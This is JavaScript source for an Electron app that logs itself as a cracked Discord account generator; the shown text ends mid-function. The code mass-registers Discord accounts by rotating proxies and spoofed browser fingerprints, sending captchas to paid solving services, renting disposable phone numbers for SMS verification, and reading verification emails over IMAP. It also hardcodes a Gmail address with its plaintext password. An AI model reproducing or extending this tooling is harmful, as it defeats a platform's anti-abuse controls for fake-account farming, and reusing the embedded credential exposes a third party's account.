const { clipboard, shell } = require('electron');
const req = require('request');
const fs = require('fs');
const uuid = require('uuid/v4');
const sha1 = require('sha1');
const Store = require('electron-store');  
const store = new Store();
const path = require('path');
const events = require('events');
const crypto = require('crypto');
var Emitter = events.EventEmitter();
var check_updater = false;

var last_data_usernames = false;

var tmp_data = {};

if (localStorage['tmp_data_reger']) tmp_data = JSON.parse(localStorage['tmp_data_reger']);

function meAtztGn1pdERnu(e) {setTimeout(console.log.bind(console, e));}

const config = {
  mail: {
    temp: {
      host: 'privatix-temp-mail-v1.p.mashape.com',
      key: ''
    }
  }
};

const css_dark = `<style type="text/css" id="dtssheet">html, body, #container{background-color:#000}nav{height:90px;background:#252525;box-shadow:0 0 10px -2px #ffffff70;border-bottom:1px solid #ffffff30}.headline-block{color:#fff}.headline-block span span:hover{background:#333;opacity:1;margin-bottom:0;box-shadow:0 0 4px 0 #ffffff80}.headline-block span span div:hover{pointer-events:all;background:#fff!important;color:#333!important;opacity:1!important}.button-action{background:#333}.block-index{box-shadow:0 0 10px -5px #ffffffa1;background:#252525}footer{background:#252525}.modal-content{background-color:#252525}footer .bottom-bar{background:#252525}.headline-block span span{color:#fff}nav ul li a:focus,nav ul li a:hover{background:#333}.slider-handle{background-image:-webkit-linear-gradient(to bottom,#5a5a5a 0,#4c4c4c 100%);background-image:-o-linear-gradient(to bottom,#5a5a5a 0,#4c4c4c 100%);background-image:linear-gradient(to bottom,#5a5a5a 0,#4c4c4c 100%)}[tooltip]::after{background:#1d1d1c;border:1px solid #ffffff3b}.block-search .tags .tag{color:#252525}.block-search-result .servers .server .invite div{background:#333;color:#fff}.block-search-result .servers .server{background:#252525}.block-search-result-h.block-index{background:0 0;box-shadow:none}.block-search-result .pages .page{background:#333}.simplebar-scrollbar:before{background:#adabab}.btn-download-search{color:#fff;background:#333}.btn-download-search:hover{background:#252525}.change-status-account:hover{background:#404040;color:#fff}.change-status-account.active{background:#404040;color:#fff}.list-change-status-account{background:#3c3c3c;color:#fff}.list-change-status-account .status.select{background:#0000003d}.list-change-status-account .status:hover{background:#0000003d}.btn-right-action:hover{background:#252525;color:#fff}.modal .close{color:#252525}.btn-gg.sel{background: #333;}.btn-gg:hover{background: #333;}.scrol-web::-webkit-scrollbar{height: 7px;width: 7px;border-radius: 10px;}.scrol-web::-webkit-scrollbar-track{background: rgba(255, 255, 255, 0.16);border-radius: 10px;}.scrol-web::-webkit-scrollbar-thumb{background: #ffffff36; border-radius: 10px;}.scrol-web::-webkit-scrollbar-thumb:hover{background: #ffffff66;border-radius: 5px;}#tags-search::-webkit-scrollbar{height: 7px;border-radius: 10px;}#tags-search::-webkit-scrollbar-track{height: 7px;background: rgba(255, 255, 255, 0.16);border-radius: 10px;}#tags-search::-webkit-scrollbar-thumb{background: #ffffff36;border-radius: 10px;}#tags-search::-webkit-scrollbar-thumb:hover{background: #ffffff66;border-radius: 5px;}.emojionearea .emojionearea-picker{background: #1D1D1C;}.emojionearea .emojionearea-picker .emojionearea-search>input{background: #1D1D1C;color: #fff;border: 1px solid #ffffff57;}.emojionearea .emojionearea-picker .emojionearea-filters .emojionearea-filter.active {background: #3e3e3e;}.emojionearea .emojionearea-picker .emojionearea-scroll-area .emojionearea-category-title{background: #1D1D1C;}.emojionearea .emojionearea-picker .emojionearea-scroll-area .emojibtn:hover{background: #3a3a3a;}.emojionearea .emojionearea-picker .emojionearea-filters{background: #292928;}.button-action:hover {background: #353535 !important;}.button-action:active {background: #353535 !important;}.block-logs{box-shadow: 0 0 10px -5px #ffffffa1;background: #252525;}.headline-block {color: #000;filter: invert(1);}.pre-block-logs {box-shadow: 0 0 10px -5px #ffffffa1;background: #252525;}.form .btn{box-shadow: 0 0 2px 0 rgba(255, 255, 255, 0.15), 0 2px 8px 0 rgba(255, 255, 255, 0.15);}.nice-select{box-shadow: 0 0 2px 0 rgba(255, 255, 255, 0.15), 0 2px 8px 0 rgba(255, 255, 255, 0.15);}.log_error{color:#ffffff;letter-spacing: .5px;}</style>`;

const user_agents = [
  [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Windows',
  'Chrome',
  '83.0.4103.116',
  '10',
  '',
  ''
  ],
]

var imapEmails = [
  {
    user: 'markcross6028@gmail.com',
    password: '77faad106'
  }
]

var defImapConnection = false;
var defImapUser = false;
var imapCache = [];

var parseUrlImap = (html) => {
  try {
    var data = html.match(/\bhttps?:\/\/\S+/gi);
    if (!data || typeof data != 'object' || data.length < 1) return false;
    return data[0]
  } catch (err) {
    return false;
  }
}

var checkEventImap = false;

function getUrlImap(connection, toCheck = false) {
  //console.log('toCheck', toCheck)
  return new Promise(async fin => {
    try {
      var delay = 24 * 3600 * 1000;
      var yesterday = new Date();
      yesterday.setTime(Date.now() - delay);
      yesterday = yesterday.toISOString();
      var searchCriteria = [
        //'UNSEEN'
        ['SINCE', yesterday]
      ];
      var fetchOptions = {
        bodies: ['TEXT', 'HEADER'],
        markSeen: true
      };
      connection.search(searchCriteria, fetchOptions).then(async function (results) {
        //console.log('Get Results!', results);
        var data = [];
        //console.log('results', results)

        results.forEach(function (item) {
          // var all = _.find(item.parts, { "which": "TEXT" })
          // var html = (Buffer.from(all.body, 'base64').toString('ascii'));
          var html;
          var header;
          item.parts.forEach(e => {
            if (e.which == 'TEXT') {
              html = e.body.substr(0, e.body.indexOf('Content-Type: text/html'));
            } else if (e.which == 'HEADER') {
              header = e.body;
            }
          })
          //console.log('header', header)
          data.push({
            html,
            to: typeof header.to == 'string' ? header.to : header.to[0],
            subject: typeof header.subject == 'string' ? header.subject : header.subject[0]
          })
        });
        if (data.length < 1) return fin({ type: false, err: 2 });

        if (!checkEventImap) {
          setTimeout(() => {
            checkEventImap = true;
          }, 100);
        }

        var html = false;

        data.forEach(e => {
          html = e.html;
        })

        if (!html) return fin({ type: false, err: 3 });
        var url = parseUrlImap(quotedPrintable.decode(html));
        meAtztGn1pdERnu(url)
        var url = await getRightUrlDiscord(url);
        meAtztGn1pdERnu(url)
        if (!url.type) {
          return fin({type: false, err: url.err});
        }
        url = url.url;
        return fin({ type: true, url });
      });
    } catch (err) {
      meAtztGn1pdERnu(err)
      return fin({ type: false, err: 1 })
    }
  })
}

function get_user_agent() {
  var a = user_agents[Math.floor(Math.random()*user_agents.length)];
  var client_build_number = [window.localStorage['clien_idD'] ? JSON.parse(window.localStorage['clien_idD']) : 51863];
  client_build_number = client_build_number[Math.floor(Math.random()*client_build_number.length)];
  var user_agent = a[0];
  var user_data = {
    os: a[1],
    browser: a[2],
    device: '',
    browser_user_agent: user_agent,
    browser_version: a[3],
    os_version: a[4],
    referrer: 'https://discord.com/register',
    referring_domain: 'discord.com',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number,
    client_event_source: null
  }
  
  var base64 = Buffer.from(JSON.stringify(user_data)).toString('base64');
  user_data.client_build_number = 9999
  var base64First = Buffer.from(JSON.stringify(user_data)).toString('base64');
  return {user_agent, base64, base64First};
}

const user_token = store.get('user_token');

var save_tokens = false;

var type_verify = 3;
var type_captcha = 1;
var country = 'ua';
var email_verify = true;
var verify_phone_check = false;
var apikey_verify_phone = false;
var apikey_captcha = false;
var avatar_load = false;
var avatars = [];
var save_usernames = false;
var check_cap_monster = false;

var check_stop = false;

const c = {
  login: 'https://discord.com/login',
  register: 'https://discord.com/register',
  invite: 'https://discord.com/invite/pubgm',
  data_key: '6Lef5iQTAAAAAKeIvIY-DeexoO3gj7ryl9rLMEnn'
}

const translate = [
  ['Отправляем запрос капчи на rucaptcha.com', 'Submit a captcha request to rucaptcha.com'],
  ['На сервере rucaptcha.com произошла неизвестная ошибка', 'Unknown error occurred on rucaptcha.com server'],
  ['Не получилось создать задание на rucaptcha.com', 'Failed to create task on rucaptcha.com'],
  ['Успешно создали задание на rucaptcha.com', 'Successfully created a quest at rucaptcha.com'],
  ['Проверяем статус задания rucaptcha.com', 'Checking the status of the task rucaptcha.com'],
  ['Задание на rucaptcha.com не было выполнено', 'The task on rucaptcha.com was not completed'],
  ['Задание на rucaptcha.com еще не выполнено', 'The task on rucaptcha.com was not completed'],
  ['Отправляем запрос капчи на anti-captcha.com', 'We send a captcha request to anti-captcha.com'],
  ['На сервере anti-captcha.com произошла неизвестная ошибка', 'Unknown error occurred on anti-captcha.com server: :err'],
  ['Не получилось создать задание на anti-captcha.com', 'Failed to create task on anti-captcha.com'],
  ['Успешно создали задание на anti-captcha.com', 'Successfully created an assignment on anti-captcha.com'],
  ['Проверяем статус задания anti-captcha.com', 'Checking the status of the anti-captcha.com job'],
  ['Задание на anti-captcha.com не было выполнено', 'The task on anti-captcha.com was not completed'],
  ['Задание на anti-captcha.com еще не выполнено.', 'The task on anti-captcha.com has not yet been completed.'],
  ['Задание Cap Monster еще не выполнено.', 'Cap Monster job has not yet completed.'],
  ['Задание на rucaptcha.com успешно выполнено.', 'Job on rucaptcha.com completed successfully.'],
  ['Задание на anti-captcha.com успешно выполнено.', 'The task at anti-captcha.com completed successfully.'],
  ['Ошибка при отправке задания на Cap Monster. Проверьте указанный адрес.', 'Error sending job to Cap Monster. Check the address provided.'],
  ['Ошибка при отправке задания на Cap Monster.', 'Error sending job to Cap Monster.'],
  ['Проверяем статус задания Cap Monster.', 'Check the status of the Cap Monster quest.'],
  ['Задание на Cap Monster не было выполнено', 'Cap Monster mission failed'],
  ['Задание Cap Monster успешно выполнено.', 'Cap Monster mission failed'],
  ['Получаем номер на sms-reg.com...', 'We get the number on sms-reg.com...'],
  ['Создали заявку на получения номера, id: :id', 'Created an application for a number, id: :id'],
  ['Произошла ошибка при попытке получения номера sms-reg.com', 'An error occurred while trying to get the sms-reg.com number'],
  ['Ваш аккаунт sms-reg.com заблокирован на 15 минут', 'Your sms-reg.com account is locked for 15 minutes'],
  ['Проверяем статус заявки...', 'Checking the status of the application...'],
  ['Номера на sms-reg.com закончились', 'The numbers on sms-reg.com are over'],
  ['Получили номер: :num', 'Received number: :num'],
  ['Не удалось получить информацию о операции.', 'Failed to get operation information.'],
  ['Получаем номер на sms-activate.ru...', 'We get the number on sms-activate.ru ...'],
  ['Создали заявку на получения номера', 'Created an application for a number'],
  ['Ваш аккаунт sms-activate.ru заблокирован', 'Your sms-activate.ru account is blocked'],
  ['На вашем аккаунте sms-activate.ru недостаточно средств.', 'Your sms-activate.ru account has insufficient funds.'],
  ['Номера на sms-activate.ru закончились', 'The numbers on sms-activate.ru are over'],
  ['Apikey sms-activate.ru указан неверно.', 'Apikey sms-activate.ru is incorrect.'],
  ['Не удалось получить номер sms-activate.ru', 'Failed to get sms-activate.ru number'],
  ['Получаем номер на onlinesim.ru...', 'We get the number on onlinesim.ru ...'],
  ['Произошла ошибка при попытке получения номера onelinesim.ru', 'An error occurred while trying to get the onelinesim.ru number'],
  ['Номера на onlinesim.ru закончились', 'The numbers on onlinesim.ru are over'],
  ['Не удалось получить номер', 'Failed to get number'],
  ['Получаем номер на cheapsms.pro...', 'We get the number on cheapsms.pro ...'],
  ['Произошла ошибка при попытке получения номера cheapsms.pro', 'An error occurred while trying to get the cheapsms.pro number'],
  ['Ваш аккаунт cheapsms.pro заблокирован', 'Your account cheapsms.pro is blocked'],
  ['На вашем аккаунте cheapsms.pro недостаточно средств.', 'Your cheapsms.pro account has insufficient funds.'],
  ['Номера на cheapsms.pro закончились', 'The numbers on cheapsms.pro are over'],
  ['Apikey cheapsms.pro указан неверно.', 'Apikey cheapsms.pro is not specified correctly.'],
  ['Не удалось получить номер cheapsms.pro', 'Failed to get cheapsms.pro number'],
  ['Проверяем статус операции...', 'Checking the status of the operation ...'],
  ['Операция на cheapsms.pro отменена', 'Operation on cheapsms.pro canceled'],
  ['Операция на sms-activate.ru отменена', 'Operation on sms-activate.ru canceled'],
  ['Код на номер не пришёл', 'The code did not come to the number'],
  ['Успешно получили код: :code', 'Successfully received the code: :code'],
  ['Смс не найдена', 'SMS not found'],
  ['Верифицируем телефон...', 'Verify the phone ...'],
  ['отсутствует', 'missing'],
  ['Регистрируем аккаунт: :email::pass (прокси: :proxy)', 'Register an account: :email::pass(proxy: :proxy)'],
  ['Не сможем зарегистрировать аккаунт - на текущем IP действуют ограничения Discord.', 'Unable to register an account - Discord restrictions apply on the current IP.'],
  ['Решаем капчу...', 'We solve a captcha...'],
  ['Аккаунт с таким email`ом уже существует', 'An account with this email already exists.'],
  ['прокси', 'proxys'],
  [[' аккаунт', ' аккаунта', ' аккаунтов'], [' account', ' accounts', ' accounts']],
  ['Получаем юзернейм...', 'Get the username...'],
  ['Не удалось получить юзернейм', 'Failed to get username'],
  ['Успешно получили юзернейм', 'Successfully received a username'],
  ['Успешно зарегистрировали аккант (:email::pass)', 'Successfully registered an account (:email::pass)'],
  ['Не удалось получить доступ к файлу для сохранения аккаунтов.', 'Failed to access file to save accounts.'],
  ['Проверяем прокси (:proxy)', 'Check proxies (:proxy)'],
  ['Нерабочий прокси - :proxy', 'Invalid proxy - :proxy'],
  ['Не удалось зарегистрировать аккаунт. Code: :err', 'Failed to register account. Code: :err'],
  ['Остановились', 'Have stopped'],
  ['Загружаю обновление...', 'Downloading update ...'],
  ['Ошибка при обновление.', 'Error updating.'],
  ['Почти готово...', 'Almost done...'],
  ['Начнем работу?', 'Let`s get started?'],
  ['Error - запустите с правами администратора. Error - run as administrator.', 'Error updating. Run as administrator.'],
  ['Неизвестный формат файла.', 'Unknown file format.'],
  ['Не можем получить email`ы из файла.', 'We can not get emails from the file.'],
  ['Слишком маленькое количество email`ов.', 'Too few emails.'],
  ['Редактировать', 'Edit'],
  ['Вы не указали email`ы.', 'You have not specified emails.'],
  ['Список email`ов успешно обновлён.', 'Email list has been updated successfully.'],
  ['Вы не указали юзернеймы.', 'You did not specify usernames.'],
  ['Слишком маленькое количество юзернеймов.', 'Too few usernames.'],
  ['Количество юзернеймов меньше количества email`ов.', 'The number of usernames is less than the number of emails.'],
  [[" юзернейм", " юзернейма", " юзернеймов"], [' username', ' usernames', ' usernames']],
  ['Список юзернеймов успешно обновлён.', 'The list of usernames has been updated successfully.'],
  ['Не можем получить прокси из файла.', 'We can not get the proxy from the file.'],
  ['Слишком маленький список прокси.', 'The proxy list is too small.'],
  ['Слишком маленькое количество прокси.<br>Проверьте синтаксис указанных прокси.', 'Too few proxies.<br>Check the syntax of the specified proxies.'],
  ['Не можем получить юзернеймы из файла.', 'Cannot get usernames from file.'],
  ['Слишком маленькое количество юзернеймов.<br>Проверьте синтаксис указанных юзернеймов.', 'Too few usernames.<br>Check the syntax of the specified usernames.'],
  ['Вы не указали прокси.', 'You did not specify a proxy.'],
  ['Слишком маленький список прокси.', 'The proxy list is too small.'],
  ['Список прокси успешно обновлён.', 'The proxy list has been updated successfully.'],
  ['Такой файл не найден либо недоступен.', 'No such file was found or is not available.'],
  ['Доступ к этому файлу запрещён.<br>Попробуйте запустить приложение с правами администратора или выберите другой файл.', 'Access to this file is denied.<br>Try to run the application with administrator rights or select another file.'],
  ['Файл успешно добавлен.<br>Когда начнется процесс регистрации этот файл автоматически будет очищен. Пожалуйста, позаботьтесь о сохранности информации в этом файле.', 'File added successfully. <br> When the registration process starts, this file will be automatically cleaned. Please take care of the safety of the information in this file.'],
  ['Изменить файл', 'Change file'],
  ['Вы не указали список прокси.', 'You did not specify a proxy list.'],
  ['Список прокси слишком мал.', 'The proxy list is too small.'],
  ['Apikey сервиса приёма смс указан неверно.', 'Apikey SMS receiving service is incorrect.'],
  ['Вы не указали файл для сохранения аккаунтов.', 'You did not specify a file to save accounts.'],
  ['Вы не указали apikey для решения капчи.', 'You did not specify apikey to solve the captcha.'],
  ['Apikey для решения капчи указан неверно.', 'Apikey for solving captcha is incorrect.'],
  ['Вы не указали количество потоков.', 'You did not specify the number of threads.'],
  ['Минимальное количество потоков - 1', 'The minimum number of threads is 1'],
  ['Максимальное количество потоков - 300', 'The maximum number of threads is 300'],
  ['Вы не указали аватары.', 'You did not specify avatars.'],
  ['Локальный IP Cap Monster указан неверно.', 'The local IP Cap Monster is not specified correctly.'],
  ['Запускаем регистратор...', 'We start the registrar ...'],
  ['Проверяем IP Cap Monster...', 'Checking IP Cap Monster ...'],
  ['Не удалось получить доступ к IP Cap Monster.', 'Failed to access IP Cap Monster.'],
  ['Останавливаем процесс регистрации...', 'We stop the registration process ...'],
  ['Количество файлов слишком мало.', 'The number of files is too small.'],
  [['изображение', 'изображения', 'изображений'], ['image', 'images', 'images']],
  ['Максимальный размер файла - 10000 КБ.', 'The maximum file size is 10,000 KB.'],
  ['1 изображение', '1 image'],
  ['Укажите локальный IP Cap Monster/Xevil (без HTTPS)', 'Specify a local IP Cap Monster/Xevil (without HTTPS)'],
  ['Ваш apikey...', 'Your apikey...'],
  ['Загружаем аватар...', 'Loading avatar...'],
  ['Успешно загрузил аватар', 'Successfully uploaded an avatar'],
  ['Ошибка при загрузки аватара: :err', 'Error loading avatar: :err'],
  ['Список email`ов слишком мал.', 'The email list is too small.'],
  ['Список юзернеймов слишком мал.', 'The usernames list is too small.'],
  ['Загрузить из файла', 'Import from file'],
  ['Отправляем запрос капчи на captcha.guru', 'We send the captcha request to captcha.guru'],
  ['Отправляем запрос капчи на deathbycaptcha.com', 'We send a captcha request to deathbycaptcha.com'],
  ['На сервере deathbycaptcha.com произошла неизвестная ошибка', 'Unknown error occurred on deathbycaptcha.com server'],
  ['Не получилось создать задание на deathbycaptcha.com', 'Could not create task on deathbycaptcha.com'],
  ['Успешно создали задание на deathbycaptcha.com', 'Successfully created a quest on deathbycaptcha.com'],
  ['Проверяем статус задания deathbycaptcha.com', 'Checking job status deathbycaptcha.com'],
  ['Задание на deathbycaptcha.com не было выполнено', 'Deathbycaptcha.com job failed'],
  ['Задание на deathbycaptcha.com еще не выполнено', 'Assignment on deathbycaptcha.com not yet completed'],
  ['Отправляем запрос капчи на captcha.guru', 'We send the captcha request to captcha.guru'],
  ['На сервере captcha.guru произошла неизвестная ошибка', 'An unknown error occurred on captcha.guru'],
  ['Не получилось создать задание на captcha.guru', 'Could not create task on captcha.guru'],
  ['Успешно создали задание на captcha.guru', 'Successfully created a quest on captcha.guru'],
  ['Проверяем статус задания captcha.guru', 'Check the status of the job captcha.guru'],
  ['Задание на captcha.guru не было выполнено', 'Captcha.guru job failed'],
  ['Задание на captcha.guru еще не выполнено', 'Captcha.guru assignment not yet completed'],
  ['Проверяем статус задания anti-captcha.com', 'Checking the status of the anti-captcha.com job'],
  ['Задание на deathbycaptcha.com успешно выполнено.', 'Job on deathbycaptcha.com completed successfully.'],
  ['Задание на captcha.guru успешно выполнено.', 'Job on captcha.guru completed successfully.'],
  [[' номер', ' номера', ' номеров'], [' number', ' numbers', ' numbers']],
  ['руб.', 'rub.'],
  ['Верифицируем почту', 'Verify mail'],
  ['Инвайтим аккаунт', 'Invite account'],
  ['Добавьте текущий IP в access ip\'s - <a onclick="var { shell } = require(\'electron\');shell.openExternal(\'http://onlinesim.ru/v2/pages/profile\')">onlinesim.com</a>', 'Add current IP to access ip\'s - <a onclick="var { shell } = require(\'electron\');shell.openExternal(\'http://onlinesim.ru/v2/pages/profile\')">onlinesim.com</a>'],
  ['Произошла неизвестная ошибка.<br>Пожалуйста, попробуйте позже.', 'An unknown error has occurred.<br>Please try again later.'],
  ['Получаем прокси...', 'Getting the proxy...'],
  ['Вы слишком часто получаете прокси.', 'You get proxies too often.'],
  ['Ошибка при подключение к серверу.', 'Error connecting to server.'],
  ['Доступных прокси в данный момент нет.', 'There are currently no proxies available.'],
  ['Прокси успешно получен.<br>Всего:', 'Proxy successfully received.<br>Total:'],
  ['Начинаем проверку...', 'Getting started...'],
  ['Проверка успешно завершена.<br>Всего:', 'Validation completed successfully.<br>Total:'],
  ['Вы не указали лимит аккантов.', 'You did not specify an account limit.'],
  ['Данные deathbycaptcha.com указаны неверно.', 'The data for deathbycaptcha.com is incorrect.'],
  ['Не удалось получить домена для временных почт.<br>Err: :err', 'Failed to get domain for temporary mail. <br> Err: :err']
  ['Номера на 5sim.net закончились', 'The numbers on 5sim.net are over'],
  ['Получаем номер на 5sim.net...', 'We get the number on 5sim.net ...'],
  ['Создали заявку на получения номера', 'Created an application for a number'],
  ['Ваш аккаунт 5sim.net заблокирован', 'Your 5sim.net account is blocked'],
  ['На вашем аккаунте 5sim.net недостаточно средств.', 'Your 5sim.net account has insufficient funds.'],
  ['Номера на 5sim.net закончились', 'The numbers on 5sim.net are over'],
  ['Apikey 5sim.net указан неверно.', 'Apikey 5sim.net is incorrect.'],
  ['Не удалось получить номер 5sim.net', 'Failed to get 5sim.net number'],
  ['Операция на 5sim.net отменена', 'Operation on 5sim.net canceled'],
];

const new_translate = {
  sms_on_over: ['Номера на sms-online.pro закончились', 'The numbers on sms-online.pro are over'],
  sms_on_get: ['Получаем номер на sms-online.pro...', 'We get the number on sms-online.pro ...'],
  sms_on_create: ['Создали заявку на получения номера', 'Created an application for a number'],
  sms_on_ban: ['Ваш аккаунт sms-online.pro заблокирован', 'Your sms-online.pro account is blocked'],
  sms_on_funds: ['На вашем аккаунте sms-online.pro недостаточно средств.', 'Your sms-online.pro account has insufficient funds.'],
  sms_on_bad_k: ['Apikey sms-online.pro указан неверно.', 'Apikey sms-online.pro is incorrect.'],
  sms_on_don_g_n: ['Не удалось получить номер sms-online.pro', 'Failed to get sms-online.pro number'],
  sms_on_canc: ['Операция на sms-online.pro отменена', 'Operation on sms-online.pro canceled'],
  ban: ['Ваш аккаунт :service заблокирован', 'Your :service account is blocked'],
  canc: ['Операция на :service отменена', 'Operation on :service canceled'],
  not_funds: ['На вашем аккаунте :service недостаточно средств.', 'Your :service account has insufficient funds.'],
  bad_k: ['Apikey :service указан неверно.', 'Apikey :service is incorrect.'],
  numbers_over: ['Номера на :service закончились', 'The numbers on :service are over'],
  don_g_n: ['Не удалось получить номер :service', 'Failed to get :service number'],
  get_phone: ['Получаем номер на :service...', 'We get the number on :service...'],
  suc_get_number: ['Получили номер: :num', 'Received number: :num'],
  no_nums_now: ['На сервисе закончились номера, повторная попытка через 30 секунд', 'The service ran out of numbers, retrying after 30 seconds'],
  dont_put_tags_exp: ['Вы не указали теги для сохранения.', 'You did not specify tags to save.'],
  dont_sel_file_for_tags_exp: ['Вы не указали файл для сохранения тегов.', 'You did not specify a file to save tags.'],
  dont_put_gmail_imap: ['Вы не указали данные от аккаунта gmail.<br>Это нужно для верификации почты.', 'You did not enter data from your gmail account.<br>This is for verification of mail.'],
  check_gmail_data: ['Проверяем данные Gmail...', 'Checking Gmail account data...'],
  err_check_gmail_data: ['Ошибка при проверке аккаунта Gmail.<br>Проверьте доступность аккаунта и доступ к приложениям.<br>Также попробуйте открыть сайт gmail.com на этом компьютере.', 'Error checking your Gmail account. <br> Check account accessibility and access to applications.<br>Also try opening gmail.com on this computer.'],
  stop_potoks: ['Завершаем потоки...', 'Im stop threads...'],
  wait_stop_potoks: ['Ожидайте завершения потоков.<br>Для мгновенной остановки используйте двойной клик.', 'Expect threads to complete.<br>Double-click to stop now.'],
  success_save_settings: ['Настройки успешно сохранены.', 'Settings saved successfully.'],
  dont_set_imap_server: ['Вы не указали сервер для Imap.', 'You did not specify an Imap server.'],
  dont_set_imap_port: ['Вы не указали порт для Imap.', 'You did not specify an Imap port.'],
  dont_set_imap_settings: ['Вы не указали настройки для Imap сервера.', 'You did not specify settings for the Imap server.'],
  error_serv_azcap: ['На сервере azcaptcha.com произошла неизвестная ошибка', 'An unknown error occurred on azcaptcha.com'],
  dont_create_task_azcap: ['Не получилось создать задание на azcaptcha.com', 'Could not create task on azcaptcha.com'],
  success_create_task_azcap: ['Успешно создали задание на azcaptcha.com', 'Successfully created a quest on azcaptcha.com'],
  checking_task_azcap: ['Проверяем статус задания azcaptcha.com', 'Check the status of the job azcaptcha.com'],
  dont_success_task_azcap: ['Задание на azcaptcha.com не было выполнено', 'azcaptcha.com job failed'],
  not_yet_success_task_azcap: ['Задание на azcaptcha.com еще не выполнено', 'azcaptcha.com assignment not yet completed'],
  send_new_task_azcap: ['Отправляем запрос капчи на azcaptcha.com', 'We send the captcha request to azcaptcha.com'],
  success_complete_task_azcap: ['Задание на azcaptcha.com успешно выполнено.', 'Job on azcaptcha.com completed successfully.'],
  dont_enable_save_tokens: ['Вы не включили сохранение токенов.', 'You have not enabled token saving.'],
  new_update_released: ['Вышло новое обновление.', 'A new update has been released.'],
  install_update: ['Установить', 'Insall'],
  dont_did_capcloud_task: ['Задание на capmonster.cloud не было выполнено', 'The task on capmonster.cloud was not completed'],
  success_create_task_capcloud: ['Успешно создали задание на capmonster.cloud', 'Successfully created an assignment on capmonster.cloud'],
  check_capcloud_task: ['Проверяем статус задания capmonster.cloud', 'Checking the status of the capmonster.cloud job'],
  not_finish_task_capcloud: ['Задание на capmonster.cloud еще не выполнено.', 'The task on capmonster.cloud has not yet been completed.'],
  success_finish_task_capcloud: ['Задание на capmonster.cloud успешно выполнено.', 'The task at capmonster.cloud completed successfully.']
};

const app_lang = store.get('language');

const default_lang = 'ru';
function translater(titles, data = false, d_data = false) {
  if (titles == null || titles.length <= 0) return false;
  var ru_index = 0;
  var en_index = 1;
  var i = ru_index;
  if (app_lang == 'en') i = en_index;
  var res = titles[i];
  if (data) {
    if (res.indexOf('{{count}}') >= 0) {
      res = res.replace('{{count}}', data);
    } else if (res.indexOf('{{account}}') >= 0) {
      res = res.replace('{{account}}', data);
    }
  }
  if (d_data) {
    for (const [key, value] of Object.entries(d_data)) {
      res = res.replace(`:${key}`, value);
    }
  }
  return res;
}

function inArray(needle, haystack) {
  for(var i = 0; i < haystack.length; i++) if(haystack[i] == needle) return true;
  return false;
}

var accounts = [];

log('[Crack] Loading cracked Xyliase..');
log('[Crack] Done.');
log('[Crack] Xyliase Generator Cracked: Crack 17.45 By Rickyf');
log('[Crack] Cracked by Rickyf');

// function get_proxy() {
//   meAtztGn1pdERnu('proxys.length: '+proxys.length);
//   return proxys[Math.floor(Math.random()*proxys.length)];
// }

const pop_error = translater(translate[149]);

var check_selenium = false;

function log(f) {
  meAtztGn1pdERnu(f);
}

var temp_domains;

function get_domains() {
  return new Promise((fin) => {
    var params = {
      method: 'GET',
      url: 'https://api4.temp-mail.org/request/domains/format/json',
    };
    req(params, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false, err: body});
      body = JSON.parse(body);
      return fin({type: true, data: body});
    });
  });
}

function get_temp_email() {
    if (!temp_domains || temp_domains.length <= 0) return false;
    var domain = temp_domains[Math.floor(temp_domains.length * Math.random())];
    var email = `${generatePassowrd(getRandomInt(13, 30))}${domain}`
    return email;
}

var domains = [
  `${rand(10000, 99999)}.com`
];

function getFirstMessage(email) {
  return new Promise((fin) => {
    var id = md5(email);
    var params = {
      method: 'GET',
      url: `https://${config.mail.temp.host}/request/mail/id/${id}/`,
      headers: {
        'X-RapidAPI-Host': config.mail.temp.host,
        'X-RapidAPI-Key': config.mail.temp.key
      }
    };
    req(params, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      body = JSON.parse(body);
      if (body.length <= 0) return fin({type: false});
      var message = body[0].mail_text;
      log('MESSAGE: '+message);
      return fin({type: true, message: message});
    });
  });
}

function generateEmail() {
  var domain = ['.com', '.net', '.org', '.tu']
  domain = domain[rand(0, domain.length)];
  var email = generatePassowrd(rand(7, 18))+`@${generatePassowrd(rand(5, 15))}.com`;
  return email;
}

function generatePassowrd(length = 7) {
  var chars = "abcdefghijklmnopqrstuvwxyz1234567890";
  var pass = "";
  for (var x = 0; x < length; x++) {
      var i = Math.floor(Math.random() * chars.length);
      pass += chars.charAt(i);
  }
  return pass;
}

function res_anticap(key, url, potok_number = 1, too_long = false) {
  return new Promise(fin => {
    add_log_send_acap(potok_number);
    req({
      method: 'POST',
      body: JSON.stringify({
        clientKey: apikey_captcha,
        softid: 943,
        task: {
          type: 'NoCaptchaTaskProxyless',
          websiteURL: url,
          websiteKey: key,
        },
      }),
      url: 'https://api.anti-captcha.com/createTask'
    }, (err, response, body) => {
      log(body);
      if (err || !response || response.statusCode != 200 || !body) {
        add_log_err_acap(potok_number, body);
        return fin({type: false, err: 974});
      }
      body = JSON.parse(body);
      if (body.errorId != 0) {
        add_log_dont_w_acap(potok_number);
        if (body.errorCode == 'ERROR_KEY_DOES_NOT_EXIST') return fin({type: false, err: 'wrong_key'});
        if (body.errorCode == 'ERROR_ZERO_BALANCE') return fin({type: false, err: 'balance'});
        return fin({type: false});
      }
      var id = body.taskId;
      var i = 0;
      add_log_success_cre_acap(potok_number);
      var time = setInterval(() => {
        add_log_check_task_acap(potok_number)
        i++;
        if (!too_long) {
          if (i > 20) {
            clearInterval(time);
            meAtztGn1pdERnu('TIMER!');
            add_log_dont_work_acap(potok_number);
            return fin({type: false});
          }
        } else {
          if (i > 20) {
            clearInterval(time);
            meAtztGn1pdERnu('TIMER!');
            add_log_dont_work_acap(potok_number);
            return fin({type: false});
          }
        }
        req({
          method: 'POST',
          body: JSON.stringify({
            clientKey: apikey_captcha,
            taskId: id
          }),
          url: 'https://api.anti-captcha.com/getTaskResult'
        }, (err, response, body) => {
          log(body);
          if (err || !response || response.statusCode != 200 || !body) {
            clearInterval(time);
            add_log_dont_work_acap(potok_number);
            return fin({type: false, err: 479});
          }
          body = JSON.parse(body);
          if (body.errorId != 0) {
            if (body.errorCode == 'ERROR_KEY_DOES_NOT_EXIST') return fin({type: false, err: 'wrong_key'});
            if (body.errorCode == 'ERROR_ZERO_BALANCE') return fin({type: false, err: 'balance'});
            if (body.errorCode == 'ERROR_CAPTCHA_UNSOLVABLE') return fin({type: false, err: 'dont_res'});
            return fin({type: false});
          }
          if (body.status != 'ready') {
